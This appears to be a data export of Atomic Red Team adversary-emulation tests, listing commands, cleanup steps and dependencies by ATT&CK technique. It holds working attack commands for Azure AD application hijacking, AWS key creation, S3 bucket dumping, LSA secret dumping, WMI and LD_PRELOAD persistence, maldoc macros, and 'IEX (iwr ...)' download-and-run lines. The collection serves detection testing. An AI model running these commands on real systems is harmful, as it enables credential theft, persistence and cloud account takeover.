$credNotAfter = (Get-Date).AddDays(1)
$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry

$cert = New-SelfSignedCertificate -DnsName ""atomicredteam.example.com"" -FriendlyName ""AtomicCert"" -CertStoreLocation Cert:\CurrentUser\My -KeyExportPolicy Exportable -Provider ""Microsoft Enhanced RSA and AES Cryptographic Provider"" -NotAfter $certNotAfter
$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())
Write-Host ""Generated certificate """"$($cert.Thumbprint)""""""

New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier ""AtomicTest"" -Usage Verify -Value $keyValue -EndDate $credNotAfter

Start-Sleep -s 30
$tenant = Get-AzureADTenantDetail
$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint
Write-Host ""Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)""
Write-Host ""End of Hijacking""
",powershell,False,,"Import-Module -Name AzureAD -ErrorAction Ignore
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzureAD -Credential $Credential -ErrorAction Ignore > $null

$app = Get-AzureADApplication -SearchString ""#{application_name}"" | Select-Object -First 1
$credz = Get-AzureADApplicationKeyCredential -ObjectId $app.ObjectId
foreach ($cred in $credz) {
  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier) -eq ""AtomicTest"") {
    Write-Host ""Removed $($cred.KeyId) key from application""
    Remove-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -KeyId $cred.KeyId
  }  
}
Get-ChildItem -Path Cert:\CurrentUser\My | where { $_.FriendlyName -eq ""AtomicCert"" } | Remove-Item
",powershell,"dependencies.0.description: AzureAD module must be installed.

dependencies.0.prereq_command: try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}

dependencies.0.get_prereq_command: Install-Module -Name AzureAD -Force

","input_arguments.username.description: Azure AD username

input_arguments.username.type: string

input_arguments.username.default: jonh@contoso.com

input_arguments.password.description: Azure AD password

input_arguments.password.type: string

input_arguments.password.default: p4sswd

input_arguments.application_name.description: Name of the targeted application

input_arguments.application_name.type: string

input_arguments.application_name.default: SuperApp

"
T1098.001,Account Manipulation: Additional Cloud Credentials,AWS - Create Access Key and Secret Key,8822c3b0-d9f9-4daf-a043-491160a31122,"Adversaries create their own new access and secret keys to programatically interact with AWS environment, which is already compromised
",iaas:aws,,,"aws iam create-access-key --user-name #{username} > ""$PathToAtomicsFolder/T1098.001/bin/aws_secret.creds""
cd ""$PathToAtomicsFolder/T1098.001/bin/""
./aws_secret.sh
",sh,,,"access_key=`cat ""$PathToAtomicsFolder/T1098.001/bin/aws_secret.creds"" | jq -r '.AccessKey.AccessKeyId'`
aws iam delete-access-key --access-key-id $access_key --user-name #{username}
rm ""$PathToAtomicsFolder/T1098.001/bin/aws_secret.creds""
",,"dependencies.0.description: Check if the user exists.

dependencies.0.prereq_command: aws iam list-users | grep #{username}

dependencies.0.get_prereq_command: echo Please run atomic test T1136.003, before running this atomic

","input_arguments.username.description: Create new AWS access and secret keys for the user

input_arguments.username.type: string

input_arguments.username.default: atomicredteam

"
T1530,Data from Cloud Storage Object,Azure - Enumerate Azure Blobs with MicroBurst,3dab4bcc-667f-4459-aea7-4162dd2d6590,"Upon successful execution, this test will utilize a wordlist to enumerate the public facing containers and blobs of a specified Azure storage account. 
See https://www.netspi.com/blog/technical/cloud-penetration-testing/anonymously-enumerating-azure-file-resources/ . 
",iaas:azure,,,"import-module ""PathToAtomicsFolder\..\ExternalPayloads\Invoke-EnumerateAzureBlobs.ps1""
Invoke-EnumerateAzureBlobs -base #{base} -permutations ""#{wordlist}"" -outputfile ""#{output_file}""
",powershell,,,"remove-item #{output_file} -erroraction silentlycontinue
",powershell,"dependencies.0.description: The Invoke-EnumerateAzureBlobs module must exist in PathToAtomicsFolder\..\ExternalPayloads.

dependencies.0.prereq_command: if (test-path ""PathToAtomicsFolder\..\ExternalPayloads\Invoke-EnumerateAzureBlobs.ps1""){exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
invoke-webrequest ""https://raw.githubusercontent.com/NetSPI/MicroBurst/156c4e9f4253b482b2b68eda4651116b9f0f2e17/Misc/Invoke-EnumerateAzureBlobs.ps1"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\Invoke-EnumerateAzureBlobs.ps1""

dependencies.1.description: The wordlist file for search permutations must exist in PathToAtomicsFolder\..\ExternalPayloads.

dependencies.1.prereq_command: if (test-path ""#{wordlist}""){exit 0} else {exit 1}

dependencies.1.get_prereq_command: invoke-webrequest ""https://raw.githubusercontent.com/NetSPI/MicroBurst/156c4e9f4253b482b2b68eda4651116b9f0f2e17/Misc/permutations.txt"" -outfile ""#{wordlist}""

","input_arguments.base.description: Azure blob keyword to enumerate (Example, storage account name)

input_arguments.base.type: string

input_arguments.base.default: secure

input_arguments.output_file.description: File to output results to

input_arguments.output_file.type: string

input_arguments.output_file.default: $env:temp\T1530Test1.txt

input_arguments.wordlist.description: File path to keywords for search permutations

input_arguments.wordlist.type: string

input_arguments.wordlist.default: PathToAtomicsFolder\..\ExternalPayloads\permutations.txt

"
T1530,Data from Cloud Storage Object,Azure - Scan for Anonymous Access to Azure Storage (Powershell),146af1f1-b74e-4aa7-9895-505eb559b4b0,"Upon successful execution, this test will test for anonymous access to Azure storage containers by invoking a web request and outputting the results to a file. 
The corresponding response could then be interpreted to determine whether or not the resource/container exists, as well as other information. 
See https://ninocrudele.com/the-three-most-effective-and-dangerous-cyberattacks-to-azure-and-countermeasures-part-2-attack-the-azure-storage-service     
",iaas:azure,,,"try{$response = invoke-webrequest ""https://#{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}"" -method ""GET""}
catch [system.net.webexception]
{if($_.Exception.Response -ne $null)
{$Response = $_.Exception.Response.GetResponseStream()
$ReadResponse = New-Object System.IO.StreamReader($Response)
$ReadResponse.BaseStream.Position = 0
$responseBody = $ReadResponse.ReadToEnd()}
else {$responseBody = ""The storage account could not be anonymously accessed.""}}
""Response received for #{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}: $responsebody"" | out-file -filepath #{output_file} -append
",powershell,,,"remove-item #{output_file} -erroraction silentlycontinue
",,,"input_arguments.base_name.description: Azure storage account name to test

input_arguments.base_name.type: string

input_arguments.base_name.default: T1530Test2

input_arguments.output_file.description: File to output results to

input_arguments.output_file.type: string

input_arguments.output_file.default: $env:temp\T1530Test2.txt

input_arguments.container_name.description: Container name to search for (optional)

input_arguments.container_name.type: string

input_arguments.container_name.default: None

input_arguments.blob_name.description: Blob name to search for (optional)

input_arguments.blob_name.type: string

input_arguments.blob_name.default: None

"
T1530,Data from Cloud Storage Object,AWS - Scan for Anonymous Access to S3,979356b9-b588-4e49-bba4-c35517c484f5,"Upon successful execution, this test will test for anonymous access to AWS S3 buckets and dumps all the files to a local folder. 
",iaas:aws,,,"aws --no-sign-request s3 cp --recursive s3://#{s3_bucket_name} /tmp/#{s3_bucket_name}
",sh,False,,"aws s3 rb s3://#{s3_bucket_name} --force 
rm -rf /tmp/#{s3_bucket_name}
",,"dependencies.0.description: Check if ~/.aws/credentials file has a default stanza is configured

dependencies.0.prereq_command: cat ~/.aws/credentials | grep ""default""
aws s3api create-bucket --bucket #{s3_bucket_name}
aws s3api put-bucket-policy --bucket #{s3_bucket_name} --policy file://$PathToAtomicsFolder/T1530/src/policy.json
touch /tmp/T1530.txt
aws s3 cp /tmp/T1530.txt s3://#{s3_bucket_name}

dependencies.0.get_prereq_command: echo Please install the aws-cli and configure your AWS default profile using: aws configure

","input_arguments.s3_bucket_name.description: Name of the bucket

input_arguments.s3_bucket_name.type: string

input_arguments.s3_bucket_name.default: redatomic-test2

"
T1003.004,OS Credential Dumping: LSA Secrets,Dumping LSA Secrets,55295ab0-a703-433b-9ca4-ae13807de12f,"Dump secrets key from Windows registry
When successful, the dumped file will be written to $env:Temp\secrets.
Attackers may use the secrets key to assist with extracting passwords and enumerating other sensitive system information.
https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/#:~:text=LSA%20Secrets%20is%20a%20registry,host%2C%20local%20security%20policy%20etc.
",windows,,,"""#{psexec_exe}"" -accepteula -s reg save HKLM\security\policy\secrets %temp%\secrets /y
",command_prompt,True,,del %temp%\secrets >nul 2> nul,powershell,"dependencies.0.description: PsExec from Sysinternals must exist on disk at specified location (#{psexec_exe})
dependencies.0.prereq_command: if (Test-Path ""#{psexec_exe}"") {exit 0} else {exit 1}
dependencies.0.get_prereq_command: Invoke-WebRequest ""https://download.sysinternals.com/files/PSTools.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\PSTools.zip""
Expand-Archive ""PathToAtomicsFolder\..\ExternalPayloads\PSTools.zip"" ""PathToAtomicsFolder\..\ExternalPayloads\PSTools"" -Force
New-Item -ItemType Directory (Split-Path ""#{psexec_exe}"") -Force | Out-Null
Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\PSTools\PsExec.exe"" ""#{psexec_exe}"" -Force
","input_arguments.psexec_exe.description: Path to PsExec executable

input_arguments.psexec_exe.type: path

input_arguments.psexec_exe.default: PathToAtomicsFolder\..\ExternalPayloads\T1003.004\bin\PsExec.exe

"
T1546.003,Event Triggered Execution: Windows Management Instrumentation Event Subscription,Persistence via WMI Event Subscription - CommandLineEventConsumer,3c64f177-28e2-49eb-a799-d767b24dd1e0,"Run from an administrator powershell window. After running, reboot the victim machine.
After it has been online for 4 minutes you should see notepad.exe running as SYSTEM.

Code references

https://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af

https://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545
",windows,,,"$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';
                EventNameSpace='root\CimV2';
                QueryLanguage=""WQL"";
                Query=""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325""};
$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';
                CommandLineTemplate=""$($Env:SystemRoot)\System32\notepad.exe"";}
$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

$FilterToConsumerArgs = @{
Filter = [Ref] $Filter;
Consumer = [Ref] $Consumer;
}
$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
",powershell,True,,"$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter ""Name = 'AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example'""
$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter ""Name = 'AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example'""
$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query ""REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"" -ErrorAction SilentlyContinue
$FilterConsumerBindingToCleanup | Remove-WmiObject
$EventConsumerToCleanup | Remove-WmiObject
$EventFilterToCleanup | Remove-WmiObject
",,,
T1546.003,Event Triggered Execution: Windows Management Instrumentation Event Subscription,Persistence via WMI Event Subscription - ActiveScriptEventConsumer,fecd0dfd-fb55-45fa-a10b-6250272d0832,"Run from an administrator powershell window. After running, reboot the victim machine.
After it has been online for 4 minutes you should see notepad.exe running as SYSTEM.

Code references

https://gist.github.com/mgreen27/ef726db0baac5623dc7f76bfa0fc494c
",windows,,,"$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';
                EventNameSpace='root\CimV2';
                QueryLanguage=""WQL"";
                Query=""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325""};
$Filter=Set-WmiInstance -Class __EventFilter -Namespace ""root\subscription"" -Arguments $FilterArgs

$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';
                ScriptingEngine='VBScript';
                ScriptText='
                Set objws = CreateObject(""Wscript.Shell"")
                objws.Run ""notepad.exe"", 0, True
                '}
$Consumer=Set-WmiInstance -Namespace ""root\subscription"" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs

$FilterToConsumerArgs = @{
Filter = $Filter;
Consumer = $Consumer;
}
$FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments $FilterToConsumerArgs
",powershell,True,,"$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class ActiveScriptEventConsumer -Filter ""Name = 'AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'""
$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter ""Name = 'AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'""
$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query ""REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"" -ErrorAction SilentlyContinue
$FilterConsumerBindingToCleanup | Remove-WmiObject
$EventConsumerToCleanup | Remove-WmiObject
$EventFilterToCleanup | Remove-WmiObject
",,,
T1546.003,Event Triggered Execution: Windows Management Instrumentation Event Subscription,Windows MOFComp.exe Load MOF File,29786d7e-8916-4de6-9c55-be7b093b2706,"The following Atomic will utilize MOFComp.exe to load a local MOF file.
The Managed Object Format (MOF) compiler parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository. 
To query for the class:  gwmi __eventfilter -namespace root\subscription
A successful execution will add the class to WMI root namespace.
Reference: https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/.
",windows,,,"#{mofcomp_path} ""#{mof_file}""
",powershell,,,"$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter ""Name = 'AtomicRedTeam_consumer'""
$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter ""Name = 'AtomicRedTeam_filter'""
$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query ""REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"" -ErrorAction SilentlyContinue
$FilterConsumerBindingToCleanup | Remove-WmiObject
$EventConsumerToCleanup | Remove-WmiObject
$EventFilterToCleanup | Remove-WmiObject
",powershell,"dependencies.0.description: MofComp.exe must exist on disk at specified location (#{mofcomp_path})

dependencies.0.prereq_command: if (Test-Path ""#{mofcomp_path}"") { exit 0} else { exit 1}

dependencies.0.get_prereq_command: Validate MOFComp.exe is on disk somewhere and update input argument.

dependencies.1.description: MofComp.exe must exist on disk at specified location (#{mof_file})

dependencies.1.prereq_command: if (Test-Path ""#{mof_file}"") { exit 0} else { exit 1}

dependencies.1.get_prereq_command: New-Item -Type Directory (split-path ""#{mof_file}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.003/src/T1546.003.mof"" -OutFile ""#{mof_file}""

","input_arguments.mofcomp_path.description: Location of mofcomp.exe

input_arguments.mofcomp_path.type: string

input_arguments.mofcomp_path.default: c:\windows\system32\wbem\mofcomp.exe

input_arguments.mof_file.description: Local location MOF file

input_arguments.mof_file.type: string

input_arguments.mof_file.default: PathToAtomicsFolder\T1546.003\src\T1546.003.mof

"
T1012,Query Registry,Query Registry,8f7578c4-9863-4d83-875c-a565573bbdf0,"Query Windows Registry.
Upon successful execution, cmd.exe will perform multiple reg queries. Some will succeed and others will fail (dependent upon OS).
References:
https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order
https://blog.cylance.com/windows-registry-persistence-part-1-introduction-attack-phases-and-windows-services
http://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf
https://www.offensive-security.com/wp-content/uploads/2015/04/wp.Registry_Quick_Find_Chart.en_us.pdf
",windows,,,"reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows""
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify""
reg query ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit""
reg query ""HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell""
reg query ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell""
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
reg query HKLM\system\currentcontrolset\services /s | findstr ImagePath 2>nul | findstr /Ri "".*\.sys$""
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
reg query ""HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components""
reg query ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup""
",command_prompt,True,,,,,
T1012,Query Registry,Query Registry with Powershell cmdlets,0434d081-bb32-42ce-bcbb-3548e4f2628f,"Query Windows Registry with Powershell cmdlets, i.e., Get-Item and Get-ChildItem. The results from above can also be achieved with Get-Item and Get-ChildItem.
Unlike using ""reg query"" which then executes reg.exe, using cmdlets won't generate new processes, which may evade detection systems monitoring process generation. 
",windows,,,"Get-Item -Path ""HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows""
Get-ChildItem -Path ""HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\"" | findstr Windows
Get-Item -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\RunServicesOnce""
Get-Item -Path ""HKCU:Software\Microsoft\Windows\CurrentVersion\RunServicesOnce""
Get-Item -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\RunServices""
Get-Item -Path ""HKCU:Software\Microsoft\Windows\CurrentVersion\RunServices""
Get-Item -Path ""HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify""
Get-Item -Path ""HKLM:Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit""
Get-Item -Path ""HKCU:Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell""
Get-Item -Path ""HKLM:Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell""
Get-Item -Path ""HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad""
Get-Item -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\RunOnce""
Get-Item -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\RunOnceEx""
Get-Item -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\Run""
Get-Item -Path ""HKCU:Software\Microsoft\Windows\CurrentVersion\Run""
Get-Item -Path ""HKCU:Software\Microsoft\Windows\CurrentVersion\RunOnce""
Get-Item -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run""
Get-Item -Path ""HKCU:Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run""
Get-ChildItem -Path ""HKLM:system\currentcontrolset\services"" 
Get-Item -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\Run""
Get-Item -Path ""HKLM:SYSTEM\CurrentControlSet\Control\SafeBoot""
Get-ChildItem -Path ""HKLM:SOFTWARE\Microsoft\Active Setup\Installed Components""
Get-ChildItem -Path ""HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup""
",powershell,True,,,,,
T1012,Query Registry,Enumerate COM Objects in Registry with Powershell,0d80d088-a84c-4353-af1a-fc8b439f1564,"This test is designed to enumerate the COM objects listed in HKCR, then output their methods and CLSIDs to a text file.
An adversary could then use this information to identify COM objects that might be vulnerable to abuse, such as using them to spawn arbitrary processes. 
See: https://www.mandiant.com/resources/hunting-com-objects",windows,,,"New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR
Get-ChildItem -Path HKCR:\CLSID -Name | Select -Skip 1 > $env:temp\clsids.txt
ForEach($CLSID in Get-Content ""$env:temp\clsids.txt"")
{try{write-output ""$($Position)-$($CLSID)""
write-output ""------------""| out-file #{output_file} -append
write-output $($CLSID)| out-file #{output_file} -append
$handle=[activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID))
$handle | get-member -erroraction silentlycontinue | out-file #{output_file} -append
$position += 1} catch{}}
",powershell,,,"remove-item #{output_file} -force -erroraction silentlycontinue
remove-item $env:temp\clsids.txt -force -erroraction silentlycontinue      
",,,"input_arguments.output_file.description: File to output list of COM objects to

input_arguments.output_file.type: string

input_arguments.output_file.default: $env:temp\T1592.002Test1.txt

"
T1574.006,Hijack Execution Flow: LD_PRELOAD,Shared Library Injection via /etc/ld.so.preload,39cb0e67-dd0d-4b74-a74b-c072db7ae991,"This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1574.006.so` to /etc/ld.so.preload. 
",linux,,,"sudo sh -c 'echo #{path_to_shared_library} > /etc/ld.so.preload'
",bash,True,,"sudo sed -i 's##{path_to_shared_library}##' /etc/ld.so.preload
",bash,"dependencies.0.description: The shared library must exist on disk at specified location (#{path_to_shared_library})

dependencies.0.prereq_command: if [ -f #{path_to_shared_library} ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}

","input_arguments.path_to_shared_library_source.description: Path to a shared library source code

input_arguments.path_to_shared_library_source.type: path

input_arguments.path_to_shared_library_source.default: PathToAtomicsFolder/T1574.006/src/Linux/T1574.006.c

input_arguments.path_to_shared_library.description: Path to a shared library object

input_arguments.path_to_shared_library.type: path

input_arguments.path_to_shared_library.default: /tmp/T1574006.so

"
T1574.006,Hijack Execution Flow: LD_PRELOAD,Shared Library Injection via LD_PRELOAD,bc219ff7-789f-4d51-9142-ecae3397deae,"This test injects a shared object library via the LD_PRELOAD environment variable to execute. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will utilize LD_PRELOAD to load the shared object library `/etc/ld.so.preload`. Output will be via stdout.
",linux,,,"LD_PRELOAD=#{path_to_shared_library} ls
",bash,,,,bash,"dependencies.0.description: The shared library must exist on disk at specified location (#{path_to_shared_library})

dependencies.0.prereq_command: if [ -f #{path_to_shared_library} ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: gcc -shared -fPIC -o #{path_to_shared_library} #{path_to_shared_library_source}

","input_arguments.path_to_shared_library_source.description: Path to a shared library source code

input_arguments.path_to_shared_library_source.type: path

input_arguments.path_to_shared_library_source.default: PathToAtomicsFolder/T1574.006/src/Linux/T1574.006.c

input_arguments.path_to_shared_library.description: Path to a shared library object

input_arguments.path_to_shared_library.type: path

input_arguments.path_to_shared_library.default: /tmp/T1574006.so

"
T1574.006,Hijack Execution Flow: LD_PRELOAD,Dylib Injection via DYLD_INSERT_LIBRARIES,4d66029d-7355-43fd-93a4-b63ba92ea1be,"injects a dylib that opens calculator via env variable
",macos,,,"DYLD_INSERT_LIBRARIES=#{dylib_file} #{file_to_inject}
",bash,False,,"kill `pgrep Calculator`
kill `pgrep firefox`
",bash,"dependencies.0.description: Compile the dylib from (#{source_file}). Destination is #{dylib_file}

dependencies.0.prereq_command: gcc -dynamiclib #{source_file} -o #{dylib_file}

dependencies.0.get_prereq_command: gcc -dynamiclib #{source_file} -o #{dylib_file}

","input_arguments.file_to_inject.description: Path of executable to be injected. Mostly works on non-apple default apps.

input_arguments.file_to_inject.type: path

input_arguments.file_to_inject.default: /Applications/Firefox.app/Contents/MacOS/firefox

input_arguments.source_file.description: Path of c source file

input_arguments.source_file.type: path

input_arguments.source_file.default: PathToAtomicsFolder/T1574.006/src/MacOS/T1574.006.c

input_arguments.dylib_file.description: Path of dylib file

input_arguments.dylib_file.type: path

input_arguments.dylib_file.default: /tmp/T1574006MOS.dylib

"
T1204.002,User Execution: Malicious File,OSTap Style Macro Execution,8bebc690-18c7-4549-bc98-210f7019efff,"This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. Upon execution, the .jse file launches wscript.exe.
Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
This is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns.
References:
  https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader
",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
$macrocode = ""   Open `""#{jse_path}`"" For Output As #1`n   Write #1, `""WScript.Quit`""`n   Close #1`n   Shell`$ `""cscript.exe #{jse_path}`""`n""
Invoke-MalDoc -macroCode $macrocode -officeProduct ""#{ms_product}""
",powershell,,,"Remove-Item #{jse_path} -ErrorAction Ignore
",powershell,"dependencies.0.description: Microsoft #{ms_product} must be installed

dependencies.0.prereq_command: try {
  New-Object -COMObject ""#{ms_product}.Application"" | Out-Null
  $process = ""#{ms_product}""; if ( $process -eq ""Word"") {$process = ""winword""}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }

dependencies.0.get_prereq_command: Write-Host ""You will need to install Microsoft #{ms_product} manually to meet this requirement""

","input_arguments.jse_path.description: Path for the macro to write out the ""malicious"" .jse file


input_arguments.jse_path.type: string

input_arguments.jse_path.default: C:\Users\Public\art.jse

input_arguments.ms_product.description: Maldoc application Word or Excel

input_arguments.ms_product.type: string

input_arguments.ms_product.default: Word

"
T1204.002,User Execution: Malicious File,OSTap Payload Download,3f3af983-118a-4fa1-85d3-ba4daa739d80,"Uses cscript //E:jscript to download a file
",windows,,,"echo var url = ""#{file_url}"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}
cscript //E:Jscript #{script_file}
",command_prompt,,,"del #{script_file} /F /Q >nul 2>&1
",,,"input_arguments.script_file.description: File to execute jscript code from

input_arguments.script_file.type: path

input_arguments.script_file.default: %TEMP%\OSTapGet.js

input_arguments.file_url.description: URL to retrieve file from

input_arguments.file_url.type: url

input_arguments.file_url.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt

"
T1204.002,User Execution: Malicious File,Maldoc choice flags command execution,0330a5d2-a45a-4272-a9ee-e364411c4b18,"This Test uses a VBA macro to execute cmd with flags observed in recent maldoc and 2nd stage downloaders. Upon execution, CMD will be launched.
Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
$macrocode = ""  a = Shell(`""cmd.exe /c choice /C Y /N /D Y /T 3`"", vbNormalFocus)""
Invoke-MalDoc -macroCode $macrocode -officeProduct ""#{ms_product}""
",powershell,,,,powershell,"dependencies.0.description: Microsoft #{ms_product} must be installed

dependencies.0.prereq_command: try {
  New-Object -COMObject ""#{ms_product}.Application"" | Out-Null
  $process = ""#{ms_product}""; if ( $process -eq ""Word"") {$process = ""winword""}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }

dependencies.0.get_prereq_command: Write-Host ""You will need to install Microsoft #{ms_product} manually to meet this requirement""

","input_arguments.ms_product.description: Maldoc application Word or Excel

input_arguments.ms_product.type: string

input_arguments.ms_product.default: Word

"
